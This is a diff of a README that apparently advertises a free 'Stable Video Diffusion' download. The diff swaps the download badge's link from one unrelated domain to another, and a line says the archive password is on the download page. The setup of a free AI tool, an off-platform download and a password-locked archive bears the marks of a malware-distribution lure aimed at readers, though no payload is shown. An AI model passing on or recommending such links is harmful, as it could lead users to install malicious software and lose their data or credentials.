@@ -18,7 +18,7 @@ Stable Video Diffusion (SVD) free — image-to-video, consistent characters, and
 
 ## Download
 
-[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/stabvid2)
+[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/stabvid2)
 
 > The archive password is shown on the download page.
 
